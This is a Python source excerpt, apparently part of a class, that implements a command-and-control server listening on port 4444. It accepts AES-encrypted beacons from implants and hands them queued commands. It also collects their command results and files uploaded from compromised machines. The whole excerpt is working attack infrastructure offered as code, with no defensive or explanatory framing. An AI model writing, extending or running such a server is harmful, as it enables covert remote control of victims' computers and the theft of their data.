    def __init__(self, host='0.0.0.0', port=4444, passphrase='default_key'):
        self.host = host
        self.port = port
        self.passphrase = passphrase
        self.clients = {}
        self.tasks = defaultdict(list)
        self.results = defaultdict(list)
        self.lock = threading.Lock()

    def handle_client(self, conn, addr):
        session_id = hashlib.sha256(os.urandom(16)).hexdigest()[:16]
        with self.lock:
            self.clients[session_id] = {'addr': addr, 'connected': time.time()}

        print('[+] Client connected: %s (session: %s)' % (addr, session_id))

        try:
            while True:
                size_bytes = conn.recv(4)
                if not size_bytes:
                    break
                size = struct.unpack('>I', size_bytes)[0]

                encrypted = b''
                while len(encrypted) < size:
                    chunk = conn.recv(min(4096, size - len(encrypted)))
                    if not chunk:
                        break
                    encrypted += chunk

                try:
                    msg = json.loads(aes_dec(encrypted, self.passphrase))
                except:
                    break

                response = {'status': 'ok'}

                if msg.get('type') == 'beacon':
                    with self.lock:
                        self.clients[session_id]['last_beacon'] = time.time()
                        if self.tasks[session_id]:
                            response['tasks'] = self.tasks[session_id]
                            self.tasks[session_id] = []

                elif msg.get('type') == 'result':
                    with self.lock:
                        self.results[session_id].append({
                            'time': time.time(),
                            'data': msg.get('data')
                        })
                    response['message'] = 'Result stored'

                elif msg.get('type') == 'file_upload':
                    filename = msg.get('filename', 'upload.bin')
                    content = msg.get('content', '')
                    print('[+] File upload: %s (%d bytes)' % (filename, len(content)))
                    response['message'] = 'File received'

                encrypted_response = aes_enc(json.dumps(response), self.passphrase)
                conn.sendall(struct.pack('>I', len(encrypted_response)) + encrypted_response)

        except Exception as e:
            pass
        finally:
            with self.lock:
                if session_id in self.clients:
                    del self.clients[session_id]
            conn.close()
            print('[-] Client disconnected: %s' % session_id)

    def add_task(self, session_id, command):
        with self.lock:
            self.tasks[session_id].append(command)
            print('[*] Task queued for %s: %s' % (session_id, command))

    def get_results(self, session_id):
        with self.lock:
            return self.results.get(session_id, [])

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(5)
        print('[*] C2 Server listening on %s:%d' % (self.host, self.port))

        while True:
            try:
                conn, addr = sock.accept()
                t = threading.Thread(target=self.handle_client, args=(conn, addr))
                t.daemon = True
                t.start()
            except KeyboardInterrupt:
                break

        sock.close()

